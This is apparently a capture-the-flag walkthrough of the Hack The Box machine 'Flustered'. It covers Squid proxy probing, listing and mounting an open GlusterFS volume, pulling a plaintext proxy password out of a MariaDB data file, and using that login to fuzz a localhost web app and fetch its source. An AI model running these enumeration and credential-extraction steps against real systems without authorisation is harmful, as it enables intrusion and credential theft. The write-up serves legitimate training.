### writeup
https://0xdf.gitlab.io/2022/02/09/htb-flustered.html#box-info

### Squid
* https://github.com/A1vinSmith/OSCP-PWK/tree/master/PgPractice/Windows/Squid

```
PORT     STATE SERVICE    VERSION
3128/tcp open  http-proxy Squid http proxy 4.6
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.6
```

```bash
❯ python3 spose.py --proxy http://$IP:3128 --target $IP
Using proxy address http://10.129.225.107:3128

no ports specified

curl --proxy http://$IP:3128 http://$IP 
```

Although, not going any further as Squid proxy requires authentication.

### GlusterFS


    Preferably, your storage environment should be located on a safe segment of your network where firewall is not necessary. In the real world, that simply isn’t possible for all environments. If you are willing to accept the potential performance loss of running a firewall, you need to know that Gluster makes use of the following ports:

        24007 TCP for the Gluster Daemon
        24008 TCP for Infiniband management (optional unless you are using IB)
        One TCP port for each brick in a volume. So, for example, if you have 4 bricks in a volume, port 24009 – 24012 would be used in GlusterFS 3.3 & below, 49152 - 49155 from GlusterFS 3.4 & later.
        38465, 38466 and 38467 TCP for the inline Gluster NFS server.
        Additionally, port 111 TCP and UDP (since always) and port 2049 TCP-only (from GlusterFS 3.4 & later) are used for port mapper and should be open.

These ports line up almost exactly with what nmap showed.

That says that 49152 and 49153 are for each for bricks in the volume, which implies this is GlusterFS 3.4+, and there are at least two bricks.

##### Enumerate Volumes
```bash
❯ gluster --remote-host=$IP volume list
ERROR: failed to create logfile "/var/log/glusterfs/cli.log" (Permission denied)
ERROR: failed to open logfile /var/log/glusterfs/cli.log
[2023-01-24 01:12:51.321158 +0000] I [cli.c:828:main] 0-cli: Started running gluster with version 10.3
[2023-01-24 01:12:51.321291 +0000] I [cli.c:702:cli_rpc_init] 0-cli: Connecting to remote glusterd at 10.129.225.107
vol1
vol2
[2023-01-24 01:12:51.913811 +0000] I [input.c:31:cli_batch] 0-: Exiting with: 0

❯ sudo gluster --remote-host=$IP volume list
vol1
vol2
```

##### Mount vol2
```bash
❯ sudo mount -t glusterfs $IP:/vol2 /mnt
Mount failed. Check the log file  for more details.
```

The log file (`/var/log/glusterfs/mnt.log` or under `/var/log/glusterfs`) shows additional information about the mount failure, which
seems to be caused by a DNS resolution error:

The last line before “Final graph” says “DNS resolution failed on host flustered”.

```bash
[2023-01-24 01:17:22.855068 +0000] E [name.c:267:af_inet_client_get_remote_sockaddr] 0-vol2-client-0: DNS resolution failed on host flustered
Final graph:
+------------------------------------------------------------------------------+
```

```bash
echo "10.129.225.107 flustered.htb flustered" | sudo tee -a /etc/hosts
```

```bash
❯ sudo mount -t glusterfs $IP:/vol2 /mnt
❯ sudo ls -l /mnt
total 122934
-rw-rw---- 1 sshd tss     16384 Oct 26  2021 aria_log.00000001
-rw-rw---- 1 sshd tss        52 Oct 26  2021 aria_log_control
-rw-r--r-- 1 root root        0 Oct 26  2021 debian-10.3.flag
-rw-rw---- 1 sshd tss       998 Jan 29  2022 ib_buffer_pool
-rw-rw---- 1 sshd tss  12582912 Oct 26  2021 ibdata1
-rw-rw---- 1 sshd tss  50331648 Oct 26  2021 ib_logfile0
-rw-rw---- 1 sshd tss  50331648 Oct 26  2021 ib_logfile1
-rw-rw---- 1 sshd tss  12582912 Jan 24 13:18 ibtmp1
-rw-rw---- 1 sshd tss         0 Oct 26  2021 multi-master.info
drwx------ 2 sshd tss      4096 Oct 26  2021 mysql
-rw-rw---- 1 root root       16 Oct 26  2021 mysql_upgrade_info
drwx------ 2 sshd tss      4096 Oct 26  2021 performance_schema
drwx------ 2 sshd tss      4096 Oct 26  2021 squid
-rw-rw---- 1 sshd tss     24576 Jan 24 13:18 tc.log
```

### Enumerate the mnt
Some Googling of the file names in that directly suggest that this is the `/var/lib/mysql` directory, which is where MariaDB (MySQL) stores it’s data. This directory actually has everything I need to recreate the database locally. Althouhg, that's the hard way to retrive the password.

##### Hard way
```
mkdir /tmp/mysql
cp -R /mnt/* /tmp/mysql/
echo -e "[mariadb]\nplugin-load-add = auth_socket.so" > /tmp/socket.cnf
docker run --name mariadb -v /tmp/socket.cnf:/etc/mysql/mariadb.conf.d/socket.cnf -v
/tmp/mysql:/var/lib/mysql -d mariadb:10.3.31
docker exec -ti mariadb mysql
```

##### Easy way
The passwd.ibd file has what looks like a username amd a name:

If “Lance Friedman” is the name, and “lance.friedman” is the username, the string in the middle is “o>WJ5-jD<5^m3”, and there’s another string, “infimum”. It’s even more clear in `xxd` (with `grep -vF` to remove the lines of completely unprintable characters):

```bash
❯ sudo cat /mnt/squid/passwd.ibd
        �▒�@!��������������������������&&������������������������       �▒��G�x�▒�NG�x�▒�Nw��▒�����������������������������������i������������������������������������������������������������������������������������������������������������������������������������������������������i���������������������������������������������������������������������������������������������������������������������������������w��▒�ׯm%��������▒��E�����2infimum
��lance.friedman�o>WJ5-jD<5^m3�Lance Friedmanpc�m%▒��%                                                                                                                                            ❯ sudo xxd /mnt/squid/passwd.ibd | grep -vF "................"
00000030: 0006 0000 0040 0000 0021 0000 0004 0000  .....@...!......
00000080: ffff ffff 0000 0000 0001 0000 0002 0026  ...............&
00000090: 0000 0002 0026 0000 0000 0000 0000 ffff  .....&..........
00004000: 47d2 78df 0000 0001 0000 0000 0000 0000  G.x.............
00004010: 0000 0000 0018 ca4e 0005 0000 0000 0000  .......N........
00007ff0: 0000 0000 0000 0000 47d2 78df 0018 ca4e  ........G.x....N
00008000: 771e baac 0000 0002 0000 0000 0000 0000  w...............
00008070: 69d2 0000 0003 ffff ffff ffff ffff ffff  i...............
00008130: 69d2 ffff ffff ffff ffff ffff ffff ffff  i...............
0000bff0: 0000 0000 0000 0000 771e baac 0018 d2d7  ........w.......
0000c000: af6d 0625 0000 0003 ffff ffff ffff ffff  .m.%............
0000c010: 0000 0000 0018 e3cd 45bf 0000 0000 0000  ........E.......
0000c050: 0002 00f2 0000 0005 0000 0002 0032 0100  .............2..
0000c060: 0200 1f69 6e66 696d 756d 0002 000b 0000  ...infimum......
0000c070: 7375 7072 656d 756d 000e 0d0e 0000 0010  supremum........
0000c080: ffee 6c61 6e63 652e 6672 6965 646d 616e  ..lance.friedman
0000c090: 0000 0000 0000 8000 0000 0000 006f 3e57  .............o>W
0000c0a0: 4a35 2d6a 443c 355e 6d33 814c 616e 6365  J5-jD<5^m3.Lance
0000c0b0: 2046 7269 6564 6d61 6e00 0000 0000 0000   Friedman.......
0000fff0: 0000 0000 0070 0063 af6d 0625 0018 e3cd  .....p.c.m.%....


❯ sudo strings /mnt/squid/passwd.ibd
infimum
supremum
lance.friedman
o>WJ5-jD<5^m3
Lance Friedman
```

### Auth Squid
Trying the different potential passwords from above, “infimum” and “supremum” both return the same invalid Squid page as previously seen. The other one does not:

```bash
❯ curl --proxy http://lance.friedman:o\>WJ5-jD\<5\^m3@$IP:3128 http://$IP/

    <html>
    <head>
    <title>steampunk-era.htb - Coming Soon</title>
    </head>
    <body style="background-image: url('/static/steampunk-3006650_1280.webp');background-size: 100%;background-repeat: no-repeat;"> 
    </body>
    </html>
```
That's the 127.0.0.1:80 page. view-source:http://10.129.225.107/

The proxy allows us to access the web server at http://127.0.0.1, which shows the default Nginx welcome page. This suggests that the local server listening on `127.0.0.1:80`, which is enabled by default in `/etc/nginx/sites-enabled/default` on Debian systems, has not been disabled

```bash
❯ curl --proxy http://lance.friedman:o\>WJ5-jD\<5\^m3@$IP:3128 http://127.0.0.1
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
```

### Directory Fuzz
##### feroxbuster
```bash
feroxbuster -u http://127.0.0.1 -p 'http://lance.friedman:o>WJ5-jD<5^m3@10.129.225.107:3128'
```

301      GET        7l       12w      185c http://127.0.0.1/app => http://127.0.0.1/app/
301      GET        7l       12w      185c http://127.0.0.1/app/templates => http://127.0.0.1/app/templates/
301      GET        7l       12w      185c http://127.0.0.1/app/config => http://127.0.0.1/app/config/
301      GET        7l       12w      185c http://127.0.0.1/app/static => http://127.0.0.1/app/static/

There’s an app directory, with templates, config, and static. This structure feels a lot like what you see with Python or Ruby frameworks, or maybe even Node. I’ll run again on the app directory, looking for those kinds of files, as well as html, as that’s what I expect in the templates directory:

```bash
feroxbuster -u http://127.0.0.1  -x py,js,rb,html -p 'http://lance.friedman:o>WJ5-jD<5^m3@10.129.225.107:3128'
```

##### gobuster
gobuster (notice that we have to URL-encode some characters in order to get a valid userinfo )
```bash
❯ gobuster dir -u http://127.0.0.1 --proxy 'http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.129.225.107:3128' -w /usr/share/wordlists/dirb/common.txt

/app                  (Status: 301) [Size: 185] [--> http://127.0.0.1/app/]

❯ gobuster dir -u http://127.0.0.1/app --proxy 'http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.129.225.107:3128' -w /usr/share/wordlists/dirb/common.txt
❯ gobuster dir -u http://127.0.0.1/app --proxy 'http://lance.friedman:o%3EWJ5-jD%3C5%5Em3@10.129.225.107:3128' -w /usr/share/wordlists/dirb/common.txt -x py

/app.py               (Status: 200) [Size: 748]
```

### app.py
```bash
curl --proxy http://lance.friedman:o\>WJ5-jD\<5\^m3@$IP:3128 http://127.0.0.1/app/app.py
```